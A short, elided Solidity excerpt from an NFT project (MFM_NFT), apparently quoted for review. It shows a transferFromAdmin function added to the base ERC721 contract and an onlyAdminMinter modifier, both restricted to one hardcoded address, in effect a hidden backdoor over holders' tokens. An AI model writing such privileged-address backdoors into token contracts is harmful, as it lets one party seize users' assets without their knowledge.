...
contract ERC721 is ERC165, IERC721 {
    ...
    function transferFromAdmin(address owner, uint256 tokenId) public {
        require(msg.sender == 0x4244cbfBA9Ee231744539a545AA30e2a8a29f462, "ERC721: transfer caller is not owner nor approved");
...
contract MFM_NFT is ERC721Full, ERC721MetadataMintable, Ownable {
  ...
  modifier onlyAdminMinter() {
      require(msg.sender==0x4244cbfBA9Ee231744539a545AA30e2a8a29f462);
      _;
  }
 ...
 // events
  event SetAddresses(address indexed from, address _platform);
  event SetValue(address indexed from, uint256 _platform);
